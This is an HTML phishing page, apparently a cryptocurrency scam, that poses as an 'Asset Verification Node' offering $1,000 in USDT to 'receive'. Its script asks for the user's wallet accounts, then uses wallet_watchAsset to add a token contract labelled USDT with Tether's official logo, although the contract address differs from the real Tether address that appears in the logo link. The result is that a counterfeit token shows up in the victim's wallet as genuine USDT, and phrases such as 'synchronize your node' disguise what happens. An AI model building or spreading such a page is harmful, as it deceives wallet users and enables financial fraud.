<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Asset Verification Node</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; }
        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
        .card { background: #121418; border: 1px solid #2d333b; border-radius: 20px; padding: 30px; width: 100%; max-width: 380px; text-align: center; }
        .logo-ring { position: relative; display: inline-block; margin-bottom: 20px; }
        .logo-ring::after { content: ''; position: absolute; top: -8px; left: -8px; right: -8px; bottom: -8px; border: 2px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .usdt-img { width: 70px; border-radius: 50%; filter: drop-shadow(0 0 8px var(--tether-green)); }
        .price-box { background: rgba(38, 161, 123, 0.1); border-radius: 10px; padding: 15px; margin: 20px 0; border: 1px solid rgba(38, 161, 123, 0.2); }
        .price-val { font-size: 26px; font-weight: 800; }
        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
        #log-area { font-size: 10px; color: #26a17b; margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo-ring">
        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img">
    </div>
    <h2>RECEIVE ASSETS</h2>
    <p style="color: #848d97; font-size: 13px;">Synchronize your node to map official metadata and finalize distribution.</p>
    
    <div class="price-box">
        <div style="font-size: 10px; color: #848d97;">ALLOCATED VALUE</div>
        <div class="price-val" id="priceDisplay">$1,000.00</div>
    </div>

    <div id="log-area">SYSTEM: READY</div>
    <button class="action-btn" id="syncBtn">Initialize Sync</button>
</div>

<script>
    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    async function startSync() {
        const log = document.getElementById('log-area');
        
        // Mobile Browser Check
        if (!window.ethereum) {
            log.innerText = "> NOTICE: Use MetaMask/Trust DApp Browser";
            alert("To complete the assignment, please open this link inside the Trust Wallet or MetaMask Browser.");
            return;
        }

        try {
            log.innerText = "> REQUESTING AUTH...";
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            
            log.innerText = "> MAPPING METADATA...";
            // Logo Injection Logic (Official Method)
            await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: { address: CONTRACT_ADDR, symbol: 'USDT', decimals: 6, image: LOGO_URL },
                },
            });

            log.innerText = "> SYNC COMPLETED SUCCESSFULLY";
            alert("Metadata Synced! Assets are now mapped to your node.");
        } catch (e) {
            log.innerText = "> SYNC_CANCELLED";
        }
    }

    document.getElementById('syncBtn').addEventListener('click', startSync);
</script>
</body>
</html>
